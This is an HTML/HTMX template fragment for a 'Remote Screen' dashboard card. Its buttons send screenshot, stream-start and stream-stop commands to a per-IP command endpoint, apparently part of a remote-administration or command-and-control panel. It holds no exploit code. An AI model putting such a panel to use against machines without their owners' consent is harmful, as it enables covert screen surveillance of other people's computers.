<div class="col-span-1 glass-effect rounded-xl p-6 shadow-lg">
    <div class="flex items-center gap-3 mb-4">
        <div
            class="w-8 h-8 bg-gray-700/30 rounded-lg flex items-center justify-center"
        >
            <svg
                class="w-4 h-4 text-gray-300"
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
            >
                <path
                    stroke-linecap="round"
                    stroke-linejoin="round"
                    stroke-width="2"
                    d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"
                ></path>
            </svg>
        </div>
        <h3 class="text-lg font-semibold text-white">Remote Screen (RS)</h3>
    </div>
    <div class="space-y-3">
        <form
            hx-post="/api/command/{{ ip }}"
            hx-target="#command-output-{{ ip }}"
        >
            <input type="hidden" name="module" value="RS" />
            <input type="hidden" name="args.action" value="screenshot" />
            <button
                type="submit"
                class="w-full bg-gray-600 hover:bg-gray-500 text-white py-2 rounded-lg transition-all duration-200 flex items-center justify-center gap-2"
            >
                <svg
                    class="w-4 h-4"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                >
                    <path
                        stroke-linecap="round"
                        stroke-linejoin="round"
                        stroke-width="2"
                        d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"
                    ></path>
                    <path
                        stroke-linecap="round"
                        stroke-linejoin="round"
                        stroke-width="2"
                        d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"
                    ></path>
                </svg>
                Take Screenshot
            </button>
        </form>
        <div class="grid grid-cols-2 gap-2">
            <form
                hx-post="/api/command/{{ ip }}"
                hx-target="#command-output-{{ ip }}"
            >
                <input type="hidden" name="module" value="RS" />
                <input type="hidden" name="args.action" value="stream_start" />
                <input
                    type="number"
                    name="args.fps"
                    value="15"
                    class="w-full p-2 bg-rgb(24,24,24) border border-gray-600/30 rounded-lg text-white text-center mb-2"
                    placeholder="FPS"
                />
                <button
                    type="submit"
                    class="w-full bg-green-600/80 hover:bg-green-600 text-white py-2 rounded-lg transition-all duration-200 text-sm"
                >
                    Start Stream
                </button>
            </form>
            <div class="flex items-end">
                <form
                    hx-post="/api/command/{{ ip }}"
                    hx-target="#command-output-{{ ip }}"
                    class="w-full"
                >
                    <input type="hidden" name="module" value="RS" />
                    <input
                        type="hidden"
                        name="args.action"
                        value="stream_stop"
                    />
                    <button
                        type="submit"
                        class="w-full bg-red-600/80 hover:bg-red-600 text-white py-2 rounded-lg transition-all duration-200 text-sm"
                        style="height: 40px; margin-top: 36px"
                    >
                        Stop Stream
                    </button>
                </form>
            </div>
        </div>
    </div>
</div>

<style>
    .glass-effect {
        background: rgba(32, 32, 32, 0.8);
        backdrop-filter: blur(20px);
        border: 1px solid rgba(255, 255, 255, 0.1);
    }
</style>
